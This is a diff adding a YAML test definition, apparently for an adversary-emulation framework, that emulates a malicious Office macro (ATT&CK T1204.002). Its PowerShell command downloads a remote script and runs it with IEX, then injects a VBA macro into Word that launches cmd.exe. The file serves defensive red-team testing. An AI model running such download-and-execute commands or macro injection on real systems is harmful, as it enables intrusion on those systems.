@@ -1,0 +1,27 @@
+---
+- id: ab1b50880382b06d48d3d23ad1786239
+  name: Maldoc choice flags command execution
+  description: 'This Test uses a VBA macro to execute cmd with flags observed in recent
+    maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
+
+    Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1)
+    to load and execute VBA code into Excel or Word documents.
+
+    '
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: 'User Execution: Malicious File'
+  platforms:
+    windows:
+      psh:
+        command: '[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N
+          /D Y /T 3`", vbNormalFocus)"; Invoke-MalDoc -macroCode $macrocode -officeProduct
+          "Word"'
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
